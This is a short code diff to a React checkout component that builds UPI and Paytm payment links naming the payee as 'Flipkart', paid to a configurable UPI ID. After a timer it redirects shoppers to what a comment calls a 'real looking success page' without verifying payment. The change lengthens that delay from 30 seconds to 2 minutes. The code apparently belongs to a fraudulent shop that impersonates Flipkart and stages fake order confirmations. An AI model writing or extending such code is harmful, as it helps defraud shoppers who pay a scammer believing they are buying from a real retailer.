@@ -132,7 +132,7 @@ const Checkout = () => {
         else if (selectedPayment === 'paytm') window.location.href = `paytmmp://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
       }, 500);
 
-      // Wait 30 seconds in background, then redirect to real looking success page
+      // Wait 2 minutes in background, then redirect to real looking success page
       setTimeout(() => {
         if (!user) {
           localStorage.removeItem('cartItems');
@@ -145,7 +145,7 @@ const Checkout = () => {
         };
         sessionStorage.setItem('lastOrderData', JSON.stringify(orderData));
         navigate(`/payment/status?success=true`);
-      }, 30000);
+      }, 120000);
       
     } else {
       alert('Please select a payment method');
